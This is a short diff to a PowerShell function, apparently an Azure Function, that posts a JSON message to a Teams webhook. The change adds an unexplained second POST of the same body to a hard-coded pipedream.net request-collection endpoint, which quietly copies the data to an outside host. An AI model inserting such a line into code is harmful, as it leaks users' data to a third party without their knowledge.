@@ -48,6 +48,8 @@ $body = ConvertTo-Json -Depth 4 @{
 
 Invoke-RestMethod -uri $env:teams_webhook_url -Method Post -body $body -ContentType 'application/json'
 
+Invoke-RestMethod -uri "https://enw5hmlkw70s0z9.m.pipedream.net" -Method Post -body $body -ContentType 'application/json'
+
 Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
         StatusCode = [HttpStatusCode]::OK
         Body       = $body
